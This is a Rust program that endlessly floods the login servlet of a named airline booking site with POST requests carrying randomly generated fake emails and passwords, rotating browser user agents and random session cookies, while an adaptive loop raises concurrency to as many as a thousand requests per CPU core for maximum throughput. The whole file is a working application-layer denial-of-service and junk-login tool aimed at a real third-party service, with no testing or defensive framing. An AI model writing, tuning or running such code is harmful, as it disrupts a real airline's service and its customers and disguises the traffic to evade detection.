use cpu_time::ProcessTime;
use futures::future::join_all;
use rand::prelude::*;
use reqwest::{
    header::{HeaderMap, HeaderName, HeaderValue, COOKIE, USER_AGENT},
    Client,
};
use serde_json::json;
use std::{error::Error, sync::Arc, time::Instant};
use tokio::{sync::Semaphore, time::Duration};

const HEADERS: [(HeaderName, &str); 6] = [
    (HeaderName::from_static("host"), "book-airinuit.crane.aero"),
    (HeaderName::from_static("accept"), "*/*"),
    (HeaderName::from_static("accept-language"), "en-US,en;q=0.9"),
    (
        HeaderName::from_static("content-type"),
        "application/x-www-form-urlencoded",
    ),
    (
        HeaderName::from_static("origin"),
        "https://book-airinuit.crane.aero",
    ),
    (
        HeaderName::from_static("referer"),
        "https://book-airinuit.crane.aero/",
    ),
];

const USER_AGENTS: [&str; 3] = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
];

const NAMES: [&str; 5] = ["james", "john", "robert", "michael", "william"];
const SURNAMES: [&str; 5] = ["smith", "johnson", "williams", "brown", "jones"];
const DOMAINS: [&str; 3] = ["gmail.com", "yahoo.com", "hotmail.com"];
const SPECIALS: [&str; 4] = ["!", "@", "#", "$"];
static FORM_DATA_TEMPLATE: &str = r#"{"ORACLE_DEBUG_MODE":"","paxInfo":"","clickedButton":"","":"Login.jsp?activeLanguage=EN","FORGET_USERNAME":"","FORGET_EMAIL":""}"#;

#[derive(Default)]
struct PerformanceMetrics {
    concurrent_requests: usize,
    last_throughput: f64,
    best_throughput: f64,
    error_rate: f64,
}

impl PerformanceMetrics {
    #[inline]
    fn new(initial_concurrent: usize) -> Self {
        Self {
            concurrent_requests: initial_concurrent,
            last_throughput: 0.0,
            best_throughput: 0.0,
            error_rate: 0.0,
        }
    }

    #[inline]
    fn adjust(&mut self, throughput: f64, success: usize, errors: usize) {
        let new_error_rate = if success + errors > 0 {
            errors as f64 / (success + errors) as f64
        } else {
            1.0
        };
        self.error_rate = if self.error_rate == 0.0 {
            new_error_rate
        } else {
            self.error_rate * 0.1 + new_error_rate * 0.9
        };

        if self.error_rate < 0.01 {
            if throughput >= self.last_throughput * 0.9 {
                if throughput > self.best_throughput {
                    self.best_throughput = throughput;
                    self.concurrent_requests = (self.concurrent_requests as f64 * 1.3) as usize;
                }
            }
        } else if self.error_rate > 0.05 {
            self.concurrent_requests = (self.concurrent_requests as f64 * 0.7) as usize;
        }

        self.concurrent_requests = self
            .concurrent_requests
            .clamp(num_cpus::get() * 10, num_cpus::get() * 1000);
        self.last_throughput = throughput;
    }
}

#[inline(always)]
fn generate_credentials() -> (String, String) {
    let mut rng = thread_rng();
    unsafe {
        (
            format!(
                "{}{}{:03}@{}",
                NAMES.get_unchecked(rng.gen_range(0..NAMES.len())),
                SURNAMES.get_unchecked(rng.gen_range(0..SURNAMES.len())),
                rng.gen_range(100..999),
                DOMAINS.get_unchecked(rng.gen_range(0..DOMAINS.len()))
            ),
            format!(
                "Pass{:04}{}",
                rng.gen_range(1000..9999),
                SPECIALS.get_unchecked(rng.gen_range(0..SPECIALS.len()))
            ),
        )
    }
}

#[inline(always)]
async fn make_request(
    client: &Client,
    base_headers: &HeaderMap,
) -> Result<(), Box<dyn Error + Send + Sync>> {
    let mut headers = base_headers.clone();
    headers.insert(
        USER_AGENT,
        HeaderValue::from_static(unsafe {
            USER_AGENTS.get_unchecked(thread_rng().gen_range(0..USER_AGENTS.len()))
        }),
    );
    headers.insert(
        COOKIE,
        HeaderValue::from_str(&format!(
            "JSESSIONID={}",
            hex::encode(rand::random::<[u8; 8]>())
        ))?,
    );

    let (username, password) = generate_credentials();
    let mut form_data: serde_json::Value = serde_json::from_str(FORM_DATA_TEMPLATE)?;
    form_data["USERNAME"] = json!(username);
    form_data["PASSWORD"] = json!(password);

    client
        .post("https://book-airinuit.crane.aero/LoginServlet")
        .headers(headers)
        .form(&form_data)
        .timeout(Duration::from_secs(5))
        .send()
        .await?;

    Ok(())
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let mut base_headers = HeaderMap::with_capacity(8);
    for (key, value) in &HEADERS {
        base_headers.insert(key, HeaderValue::from_static(value));
    }

    let client = Arc::new(
        Client::builder()
            .pool_max_idle_per_host(5000)
            .pool_idle_timeout(Some(Duration::from_secs(20)))
            .tcp_keepalive(Some(Duration::from_secs(20)))
            .tcp_nodelay(true)
            .timeout(Duration::from_secs(5))
            .connect_timeout(Duration::from_secs(3))
            .http2_keep_alive_interval(Duration::from_secs(10))
            .http2_keep_alive_timeout(Duration::from_secs(5))
            .build()?,
    );

    let mut metrics = PerformanceMetrics::new(num_cpus::get() * 10);
    let mut total_success = 0;
    let mut total_errors = 0;

    loop {
        let start = Instant::now();
        let cpu_start = ProcessTime::now();
        let semaphore = Arc::new(Semaphore::new(metrics.concurrent_requests));
        let mut handles = Vec::with_capacity(metrics.concurrent_requests);

        for _ in 0..metrics.concurrent_requests {
            let client = client.clone();
            let semaphore = semaphore.clone();
            let base_headers = base_headers.clone();
            handles.push(tokio::spawn(async move {
                let _permit = semaphore.acquire().await.unwrap();
                make_request(&client, &base_headers).await.is_ok()
            }));
        }

        let results = join_all(handles).await;
        let (success, errors): (Vec<_>, Vec<_>) =
            results.into_iter().filter_map(|r| r.ok()).partition(|&r| r);

        total_success += success.len();
        total_errors += errors.len();

        let elapsed = start.elapsed().as_secs_f64();
        let throughput = success.len() as f64 / elapsed;
        let cpu_usage =
            (cpu_start.elapsed().as_secs_f64() / elapsed / num_cpus::get() as f64) * 100.0;

        metrics.adjust(throughput, success.len(), errors.len());

        println!(
            "Throughput: {:.2} req/s | CPU: {:.1}% | Concurrent: {} | Total Success/Error: {}/{}",
            throughput, cpu_usage, metrics.concurrent_requests, total_success, total_errors
        );

        tokio::time::sleep(Duration::from_millis(if metrics.error_rate < 0.01 {
            5
        } else {
            25
        }))
        .await;
    }
}
